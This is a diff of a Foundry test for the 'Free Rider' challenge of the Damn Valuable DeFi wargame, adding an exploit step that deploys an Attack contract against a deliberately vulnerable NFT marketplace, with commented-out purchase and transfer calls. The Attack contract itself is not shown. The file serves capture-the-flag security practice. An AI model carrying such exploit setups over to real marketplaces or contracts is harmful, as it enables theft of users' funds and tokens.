@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 import {FreeRiderBuyer} from "../../../src/Contracts/free-rider/FreeRiderBuyer.sol";
 import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
 import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
+import {Attack} from "../../../src/Contracts/free-rider/Attack.sol";
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
@@ -135,7 +136,24 @@ contract FreeRider is Test {
          * EXPLOIT START *
          */
         vm.startPrank(attacker, attacker);
-
+        // vm.deal(attacker, 16 ether);
+        // uint256[] memory NFTsToBuy = new uint256[](6);
+        // for (uint8 i = 0; i < AMOUNT_OF_NFTS;) {
+        //     NFTsToBuy[i] = i;
+        //     unchecked {
+        //         ++i;
+        //     }
+        // }
+        // freeRiderNFTMarketplace.buyMany{value: 15 ether}(NFTsToBuy);
+        // console.log(damnValuableNFT.balanceOf(attacker));
+        // damnValuableNFT.safeTransferFrom(attacker, address(freeRiderBuyer), 0);
+        // damnValuableNFT.safeTransferFrom(attacker, address(freeRiderBuyer), 1);
+        // damnValuableNFT.safeTransferFrom(attacker, address(freeRiderBuyer), 2);
+        // damnValuableNFT.safeTransferFrom(attacker, address(freeRiderBuyer), 3);
+        // damnValuableNFT.safeTransferFrom(attacker, address(freeRiderBuyer), 4);
+        // damnValuableNFT.safeTransferFrom(attacker, address(freeRiderBuyer), 5);
+        Attack attack =
+            new Attack(address(uniswapV2Pair), address(freeRiderNFTMarketplace), buyer, attacker, address(weth));
         vm.stopPrank();
         /**
          * EXPLOIT END *
